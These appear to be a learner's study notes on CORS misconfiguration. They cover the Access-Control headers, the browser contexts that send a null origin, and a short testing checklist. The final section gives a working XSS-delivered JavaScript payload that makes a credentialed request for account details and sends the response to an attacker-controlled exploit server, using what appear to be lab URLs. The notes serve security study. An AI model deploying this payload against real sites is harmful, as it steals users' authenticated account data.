# What is CORS?

Cross-Origin-Resource-Sharing(CORS) is a browser functionality to allow controlled access to load third party resources other than its web application domain. It extends functionality to Same-origin policy which is used to restrict access.
However, if misconfigured, it gives potential for cross domain attacks.

This is usually controlled at the client or browser side, but its primarily a server side misconfiguration as CORS restrictions are imposed by the server and the client merely enforces this by allowing or dropping requests.

Access-Control-Allow-Origin

Access-Control-Allow-Credentials

<img width="766" alt="image" src="https://github.com/user-attachments/assets/2b4153ce-6b5b-40e3-8451-a33b61e52731" />


Some caveats that i realised, victim needs to have a valid browser session that is authenticated for CORS to work.

# Cross Origin Null Requests

Origin header accepts the null value, we can test if the Access-Control-Allow-Origin allows it.

![image](https://github.com/user-attachments/assets/5ac0b179-7557-4293-b373-138a5882ba25)


Specific instances where browser sends a origin header with a null value:

1. sandbox Attribute on iframes
When an iframe is created with the sandbox attribute, its origin is set to null unless specific permissions (e.g., allow-same-origin) are granted.

```html
<iframe sandbox="allow-scripts" src="https://example.com"></iframe>
```

2.Serving from data: or blob: URLs
When content is served from a data: or blob: URL, the origin is null because these URLs are not associated with a specific domain.

3. Local File Access (file://)
When a resource is accessed via the file:// protocol, the browser sets the origin to null.

4. Cross-Origin Redirect to a Non-Originating Context
If a redirect leads to a cross-origin request where the destination does not have a valid origin, the browser may set Origin: null.

> [!NOTE]
> if using script such as XMLHttpRequest.setRequestHeader('Origin', 'null'), security policy on browser will strip this unless explicitly enforced.


#Testing for CORS Misconfigurations

1.Test for arbitary domains in origin header
2.Test for NULL value in origin header
3.Test for whitelisted subdomains in origin header
![image](https://github.com/user-attachments/assets/ed89e41e-45cd-48ae-a4a7-f6d2278399a8)



# Exploiting CORS using XSS on a vulnerable subdomain

It is possible to gain access and exploit CORS using whitelisted subdomains that has a XSS vulnerability.
We can inject this piece of script into the parameter that is vulnerable to XSS.

```javascript
var xhr = new XMLHttpRequest();
var url = 'https://0a930083040d040085e42c78009b0058.web-security-academy.net/accountDetails';
xhr.onload = reqListener;
xhr.open('GET', url);
xhr.withCredentials = true;
xhr.send();

function reqListener(){
location='https://exploit-0a4500930461042e85ef2bd701a9004c.exploit-server.net/exploit?key=' + xhr.responseText;
};
```



